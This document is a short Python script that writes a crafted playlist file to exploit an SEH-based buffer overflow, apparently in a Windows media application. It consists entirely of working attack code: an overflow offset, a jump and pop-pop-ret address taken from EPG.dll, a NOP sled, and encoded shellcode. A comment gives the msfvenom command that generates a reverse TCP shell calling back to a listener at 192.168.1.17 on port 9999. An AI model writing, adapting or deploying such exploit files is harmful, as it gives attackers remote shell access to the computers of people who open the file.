#!/usr/bin/python

filename = "kalisa-final.plf"

offset = "A" * 608
nextSEH = "\xeb\x06\x90\x90" #breakpoint
# 0x61602ADB
SEH = "\xDB\x2A\x60\x61" #pop-pop-ret from EPG.dll
#  msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=192.168.1.17 LPORT=9999 -e x86/shikata_ga_nai -b '\x00\x0A\x0D\x1A' -f python -v shellcode
shellcode =  ""
shellcode += "\xba\x1e\xfe\x32\xc4\xda\xce\xd9\x74\x24\xf4\x5f"
shellcode += "\x33\xc9\xb1\x52\x31\x57\x12\x83\xef\xfc\x03\x49"
shellcode += "\xf0\xd0\x31\x89\xe4\x97\xba\x71\xf5\xf7\x33\x94"
shellcode += "\xc4\x37\x27\xdd\x77\x88\x23\xb3\x7b\x63\x61\x27"
shellcode += "\x0f\x01\xae\x48\xb8\xac\x88\x67\x39\x9c\xe9\xe6"
shellcode += "\xb9\xdf\x3d\xc8\x80\x2f\x30\x09\xc4\x52\xb9\x5b"
shellcode += "\x9d\x19\x6c\x4b\xaa\x54\xad\xe0\xe0\x79\xb5\x15"
shellcode += "\xb0\x78\x94\x88\xca\x22\x36\x2b\x1e\x5f\x7f\x33"
shellcode += "\x43\x5a\xc9\xc8\xb7\x10\xc8\x18\x86\xd9\x67\x65"
shellcode += "\x26\x28\x79\xa2\x81\xd3\x0c\xda\xf1\x6e\x17\x19"
shellcode += "\x8b\xb4\x92\xb9\x2b\x3e\x04\x65\xcd\x93\xd3\xee"
shellcode += "\xc1\x58\x97\xa8\xc5\x5f\x74\xc3\xf2\xd4\x7b\x03"
shellcode += "\x73\xae\x5f\x87\xdf\x74\xc1\x9e\x85\xdb\xfe\xc0"
shellcode += "\x65\x83\x5a\x8b\x88\xd0\xd6\xd6\xc4\x15\xdb\xe8"
shellcode += "\x14\x32\x6c\x9b\x26\x9d\xc6\x33\x0b\x56\xc1\xc4"
shellcode += "\x6c\x4d\xb5\x5a\x93\x6e\xc6\x73\x50\x3a\x96\xeb"
shellcode += "\x71\x43\x7d\xeb\x7e\x96\xd2\xbb\xd0\x49\x93\x6b"
shellcode += "\x91\x39\x7b\x61\x1e\x65\x9b\x8a\xf4\x0e\x36\x71"
shellcode += "\x9f\xf0\x6f\x78\x4e\x99\x6d\x7a\x57\x56\xfb\x9c"
shellcode += "\xfd\x78\xad\x37\x6a\xe0\xf4\xc3\x0b\xed\x22\xae"
shellcode += "\x0c\x65\xc1\x4f\xc2\x8e\xac\x43\xb3\x7e\xfb\x39"
shellcode += "\x12\x80\xd1\x55\xf8\x13\xbe\xa5\x77\x08\x69\xf2"
shellcode += "\xd0\xfe\x60\x96\xcc\x59\xdb\x84\x0c\x3f\x24\x0c"
shellcode += "\xcb\xfc\xab\x8d\x9e\xb9\x8f\x9d\x66\x41\x94\xc9"
shellcode += "\x36\x14\x42\xa7\xf0\xce\x24\x11\xab\xbd\xee\xf5"
shellcode += "\x2a\x8e\x30\x83\x32\xdb\xc6\x6b\x82\xb2\x9e\x94"
shellcode += "\x2b\x53\x17\xed\x51\xc3\xd8\x24\xd2\xf3\x92\x64"
shellcode += "\x73\x9c\x7a\xfd\xc1\xc1\x7c\x28\x05\xfc\xfe\xd8"
shellcode += "\xf6\xfb\x1f\xa9\xf3\x40\x98\x42\x8e\xd9\x4d\x64"
shellcode += "\x3d\xd9\x47"

buffer = offset + nextSEH + SEH + "\x90" * 20 + shellcode

f = open(filename, 'w')
f.write(buffer)
f.close()
